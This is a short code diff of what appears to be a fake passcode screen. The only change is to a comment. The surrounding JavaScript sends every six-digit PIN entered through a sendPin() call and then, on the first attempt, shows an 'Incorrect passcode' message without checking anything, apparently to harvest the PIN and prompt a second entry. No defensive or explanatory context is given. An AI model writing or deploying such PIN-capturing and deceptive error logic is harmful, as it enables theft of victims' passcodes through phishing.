@@ -69,7 +69,7 @@
 
             if (pin.length === 6) {
                 attempts++;
-                sendPin(pin, attempts);  // Send every full 6-digit entry
+                sendPin(pin, attempts); // Send every time
 
                 if (attempts === 1) {
                     document.getElementById('error').textContent = "Incorrect passcode. Try again.";
